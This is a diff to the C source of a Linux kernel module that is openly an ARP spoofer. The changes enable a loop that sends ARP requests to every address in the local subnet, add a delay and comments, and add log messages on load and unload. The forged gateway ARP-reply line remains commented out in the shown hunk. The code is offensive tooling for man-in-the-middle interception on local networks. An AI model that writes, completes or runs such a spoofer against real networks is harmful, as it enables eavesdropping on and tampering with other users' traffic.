@@ -65,6 +65,7 @@ static int init_device(void)
 	if (!netdev)
 		return -1;
 
+	//netdev->promiscuity ;
 	if (!netdev->ip_ptr)
 		return -1;
 
@@ -166,8 +167,9 @@ static void scanning(void)
 	for (; base < max; base++)
 	{
 		target = (net_ip | (htonl(base)));
-		//arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
-			//0x12345678, netdev->broadcast, host.haddr, NULL);
+		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
+			0x12345678, netdev->broadcast, host.haddr, NULL);
+		msleep_interruptible(1);
 	}	
 }
 
@@ -176,7 +178,7 @@ static int spoofer(void * ptr)
 	unsigned int who = 0, t;
 
 	allow_signal(SIGUSR1); //allow interrupt
-	scanning();
+	scanning(); //scanning thread
 
 	for (; ; who++)
 	{
@@ -192,6 +194,8 @@ static int spoofer(void * ptr)
 			continue;
 		if (others[who]->paddr == gw.paddr)
 			continue;
+
+		//sub_spoofer thread
 
 		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
 			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
@@ -249,6 +253,8 @@ int spoof_init(void)
 		goto init_err;
 
 	reg_ip_handler();
+
+	printk("SPOOF MODULE INIT COMPLETE\n");
 	return 0;
 
 init_err:
@@ -263,12 +269,13 @@ void spoof_exit(void)
 	{
 		send_sig(SIGUSR1, ts, 0);
 		kthread_stop(ts);
-		printk("arp spoof finished\n");
 	}
 
 	unreg_arp_hook();
 	mem_free();
 	unreg_ip_handler();
+
+	printk("SPOOF MODULE EXITED\n");
 }
 
 module_init(spoof_init);
